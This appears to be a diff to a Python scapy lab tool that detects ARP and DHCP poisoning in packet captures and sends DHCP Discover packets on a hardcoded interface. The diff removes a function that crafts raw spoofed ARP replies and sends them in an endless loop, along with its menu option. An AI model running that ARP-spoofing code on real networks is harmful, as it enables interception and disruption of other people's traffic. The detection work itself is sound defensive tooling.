@@ -3,10 +3,6 @@ from scapy.layers.l2 import Ether, ARP
 from scapy.layers.inet import IP, UDP
 from scapy.layers.dhcp import BOOTP, DHCP
 from collections import Counter, defaultdict
-import socket
-import struct
-import fcntl
-import time
 
 def reader(pcap_file):
     try:
@@ -105,7 +101,7 @@ def detect_arp_poisoning(pcap_file):
     except Exception as e:
         print(f"An error occurred while analyzing the pcap file: {e}")
 
-def send_dhcp_discover(target_ip, target_mac, iface):
+def send_dhcp_discover(target_ip, target_mac):
     try:
         dhcp_discover = (
             Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") /
@@ -114,50 +110,10 @@ def send_dhcp_discover(target_ip, target_mac, iface):
             BOOTP(chaddr=RandMAC()) /
             DHCP(options=[("message-type", "discover"), "end"])
         )
-        sendp(dhcp_discover, iface=iface, verbose=False)  # Send the packet via the specified network interface
+        sendp(dhcp_discover, iface="h1-eth0", verbose=False)  # Send the packet via the network interface
         print("DHCP Discover packet sent!")
     except Exception as e:
         print(f"An error occurred while sending DHCP Discover: {e}")
-
-def send_arp_poisoning(target_ip, spoof_ip, target_mac, iface):
-    try:
-        # Create a raw socket for Ethernet frames
-        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
-
-        # Construct the Ethernet header
-        ether_header = struct.pack(
-            "!6s6s2s",
-            bytes.fromhex(target_mac.replace(":", "")),  # Target MAC address
-            bytes.fromhex("ff:ff:ff:ff:ff:ff".replace(":", "")),  # Broadcast MAC
-            struct.pack("!H", 0x0806)  # Ethertype for ARP
-        )
-
-        # Construct the ARP header
-        arp_header = struct.pack(
-            "!HHBBH6s4s6s4s",
-            0x0001,  # Hardware type (Ethernet)
-            0x0800,  # Protocol type (IPv4)
-            6,  # Hardware address length
-            4,  # Protocol address length
-            2,  # ARP operation (Reply)
-            bytes.fromhex(target_mac.replace(":", "")),  # Target MAC address
-            socket.inet_aton(target_ip),  # Target IP address
-            bytes.fromhex("00:00:00:00:00:00".replace(":", "")),  # Source MAC address (spoofed)
-            socket.inet_aton(spoof_ip)  # Source IP address (spoofed)
-        )
-
-        # Combine Ethernet and ARP headers
-        packet = ether_header + arp_header
-
-        # Send the packet indefinitely
-        print(f"[+] Sending ARP Poisoning packets to {target_ip} with spoofed IP {spoof_ip}")
-        while True:
-            s.send(packet)  # Send the raw ARP packet
-            time.sleep(1)  # Adjust delay as necessary
-    except KeyboardInterrupt:
-        print("\n[-] Stopping ARP Poisoning")
-    except Exception as e:
-        print(f"[!] Error occurred: {e}")
 
 if __name__ == "__main__":
     while True:
@@ -166,7 +122,6 @@ if __name__ == "__main__":
         print("2. Detect DHCP Poisoning")
         print("3. Detect ARP Poisoning")
         print("4. Send DHCP Discover")
-        print("5. Send ARP Poisoning")
         print("Type 'exit' to quit.")
         choice = input("Enter your choice: ").strip()
 
@@ -187,15 +142,7 @@ if __name__ == "__main__":
         elif choice == '4':
             target_ip = input("Enter the target IP address: ").strip()
             target_mac = input("Enter the target MAC address: ").strip()
-            iface = input("Enter the network interface: ").strip()
-            send_dhcp_discover(target_ip, target_mac, iface)
-
-        elif choice == '5':
-            target_ip = input("Enter the target IP address: ").strip()
-            spoof_ip = input("Enter the spoofed IP address: ").strip()
-            target_mac = input("Enter the target MAC address: ").strip()
-            iface = input("Enter the network interface: ").strip()
-            send_arp_poisoning(target_ip, spoof_ip, target_mac, iface)
+            send_dhcp_discover(target_ip, target_mac)
 
         else:
             print("Invalid option. Please try again.")
